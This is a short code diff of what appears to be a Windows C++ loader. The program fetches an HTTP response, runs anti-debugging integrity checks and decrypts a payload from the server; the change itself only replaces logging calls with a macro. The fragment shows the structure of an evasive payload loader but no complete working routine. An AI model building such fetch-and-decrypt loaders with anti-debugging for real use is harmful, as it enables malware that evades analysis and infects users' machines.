@@ -36,7 +36,7 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 
     // Error handling
     if (response.length() <= 0) {
-        Logging::Red("[Error] Empty HTTP response from server");
+        LOG("[Error] Empty HTTP response from server", Logging::Red);
         exit(-6);
     };
 
@@ -44,8 +44,7 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
     antiDbg.KillIfIntegrityCheckFails();
     vector<BYTE>* dPayload = payloadManager->GetDecryptedPayload(response);
 
-
-    Logging::Green("First 3 bytes of decrypted payload: " + dPayload->data()[0] + dPayload->data()[1] + dPayload->data()[2]);
+    LOG("First 3 bytes of decrypted payload: " + dPayload->data()[0] + dPayload->data()[1] + dPayload->data()[2], Logging::Green);
 
 
     antiDbg.KillIfIntegrityCheckFails();
